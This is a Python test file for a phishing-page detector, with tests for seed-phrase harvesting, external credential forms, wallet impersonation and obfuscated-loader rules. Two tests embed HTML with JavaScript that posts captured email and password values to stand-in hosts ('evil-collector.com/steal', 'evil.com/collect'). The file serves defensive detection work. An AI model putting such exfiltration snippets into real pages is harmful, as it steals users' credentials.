"""Tests for individual rule modules."""

from src.ml.features import parse_html
from src.rules.external_form import ExternalFormRule
from src.rules.obfuscated_loader import ObfuscatedLoaderRule
from src.rules.seed_phrase import SeedPhraseRule
from src.rules.wallet_impersonation import WalletImpersonationRule

from tests.fixtures import (
    CLEAN_HTML,
    EXTERNAL_FORM_PHISHING,
    MINIMAL_HTML,
    OBFUSCATED_LOADER_PHISHING,
    SEED_PHRASE_PHISHING,
    WALLET_IMPERSONATION_PHISHING,
)


class TestSeedPhraseRule:
    def setup_method(self):
        self.rule = SeedPhraseRule()

    def test_triggers_on_seed_phrase_page(self):
        soup = parse_html(SEED_PHRASE_PHISHING)
        result = self.rule.evaluate(SEED_PHRASE_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "seed-phrase-harvesting"
        assert result.signals["input_count"] >= 8

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_few_inputs_does_not_trigger(self):
        html = """<html><body>
        <p>Enter your recovery phrase</p>
        <input type="text"><input type="text"><input type="text">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # only 3 inputs, need 8


class TestExternalFormRule:
    def setup_method(self):
        self.rule = ExternalFormRule()

    def test_triggers_on_external_form(self):
        soup = parse_html(EXTERNAL_FORM_PHISHING)
        result = self.rule.evaluate(EXTERNAL_FORM_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "external-credential-form"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_internal_action_does_not_trigger(self):
        html = """<html><body>
        <form action="/login" method="POST">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # relative URL, not external

    def test_js_ajax_exfil_triggers(self):
        """Password + $.ajax to external URL = credential exfiltration."""
        html = """<html><body>
        <form action="#">
            <input type="text" name="email">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>
        $.ajax({
            url: "https://evil-collector.com/steal",
            method: "POST",
            data: {email: $("#email").val(), pw: $("#pw").val()}
        });
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert len(result.signals["strong_exfil_patterns"]) > 0

    def test_js_fetch_with_cred_access_triggers(self):
        """Password + fetch() reading .value to external URL = exfiltration."""
        html = """<html><body>
        <input type="password" id="pw">
        <script>
        var pw = document.getElementById("pw").value;
        fetch("https://evil.com/collect", {method: "POST", body: pw});
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is True
        assert result.signals["fetch_with_creds"] is True

    def test_js_fetch_without_cred_access_does_not_trigger(self):
        """Password + fetch() without .value/FormData = NOT exfiltration.
        This is the key false-positive fix: modern apps use fetch() for
        routine API calls alongside login forms."""
        html = """<html><body>
        <input type="password" name="pw">
        <script>
        fetch("https://api.example.com/config").then(r => r.json());
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False

    def test_password_with_no_exfil_does_not_trigger(self):
        """Password field alone without external communication is not enough."""
        html = """<html><body>
        <form action="#">
            <input type="password" name="pw">
            <button>Login</button>
        </form>
        <script>console.log("hello");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False


class TestWalletImpersonationRule:
    def setup_method(self):
        self.rule = WalletImpersonationRule()

    def test_triggers_on_wallet_impersonation(self):
        soup = parse_html(WALLET_IMPERSONATION_PHISHING)
        result = self.rule.evaluate(WALLET_IMPERSONATION_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "wallet-impersonation"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_brand_without_credential_capture_does_not_trigger(self):
        html = """<html><head><title>MetaMask News</title></head>
        <body><h1>MetaMask updates</h1><p>New features released.</p></body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # no password/key phrases

    def test_brand_with_key_phrases_but_no_password_does_not_trigger(self):
        """Editorial content discussing wallets should not trigger.
        Regression test for false positives on blogs/dApps."""
        html = """<html><head><title>Crypto Guide</title></head>
        <body><h1>Binance Tutorial</h1>
        <p>Store your seed phrase in a safe place.</p>
        <p>Never share your private key with anyone.</p>
        <input type="text" placeholder="Search articles...">
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False  # key phrases without password input


class TestObfuscatedLoaderRule:
    def setup_method(self):
        self.rule = ObfuscatedLoaderRule()

    def test_triggers_on_obfuscated_loader(self):
        soup = parse_html(OBFUSCATED_LOADER_PHISHING)
        result = self.rule.evaluate(OBFUSCATED_LOADER_PHISHING, soup)
        assert result.triggered is True
        assert result.rule_name == "obfuscated-loader"

    def test_clean_page_does_not_trigger(self):
        soup = parse_html(CLEAN_HTML)
        result = self.rule.evaluate(CLEAN_HTML, soup)
        assert result.triggered is False

    def test_normal_script_does_not_trigger(self):
        html = """<html><body>
        <script>console.log("hello world");</script>
        </body></html>"""
        soup = parse_html(html)
        result = self.rule.evaluate(html, soup)
        assert result.triggered is False
